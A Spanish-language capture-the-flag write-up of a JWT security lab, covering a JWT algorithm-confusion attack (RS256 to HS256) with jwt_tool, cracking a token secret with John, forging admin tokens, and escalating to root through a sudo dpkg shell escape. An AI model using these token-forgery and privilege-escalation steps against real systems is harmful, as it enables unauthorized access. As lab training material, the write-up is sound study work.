## Reconocimiento:

Puerto 22 : SSH

Puerto 5000 : HTTP

La web es un JWT Security Lab. La idea es practicar la manipulación de JWT (Jason Web Tokens) para ganar acceso privilegiado dentro de la web.

Primero creo un usuario, después consigo su JWT en la parte de Storage → LocalStorage.

Observaciones:

- El algoritmo utilizado es `RS256` (RSA con SHA-256).
- El campo `role` es el vector de ataque objetivo.
- RS256 requiere un par de claves pública/privada para firmar y verificar tokens.

Encuentro la calve publica haciendo fuzzing de directorios con Gobuster:

```bash
http://172.17.0.2:5000/public.pem
```

Usare jwt_tool para la explotación de confusión de claves:

GitHub - ticarpi/jwt_tool: :snake: A toolkit for testing, tweaking and cracking JSON Web Tokens

Antes voy a modificar el token cambiando desde el depurador:

```bash
Cambiar "alg": "RS256" a "alg": "HS256"
Cambiar "role": "user" a "role": "admin"

Genera : <JTW NUEVO>
```

Ahora genero el token malicioso:

```bash
python3 jwt_tool.py <JWT NUEVO> -X k -pk public.pem
```

El token generado lo reemplazo y consigo las credenciales para el nivel 2:

```bash
sysadmin:megatoken
```

Dentro hay un panel con el usuario Guest y hay que conseguir privilegios de admin.

Para este hay que encontrar la secret key, así que utilizare John:

```bash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

Resultado : secret123

Utilizo:

```bash
www.jwt.io
```

dentro agrego el JWT y lo modifico con los siguientes parametros:

```bash
{
  "sub": "admin",
  "role": "admin",
  "user": "admin",
  "iat": 1765905077,
  "exp": 1765908677
}

secret123
```

El token generado lo reemplazo en la web y obtengo las credenciales SSH:

```bash
jason:webtoken
```

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/dpkg
```

Gracias GTFO Bins como siempre:

```bash
sudo /usr/bin/dpkg -l
# Dentro:
!/bin/sh
```

Listo.
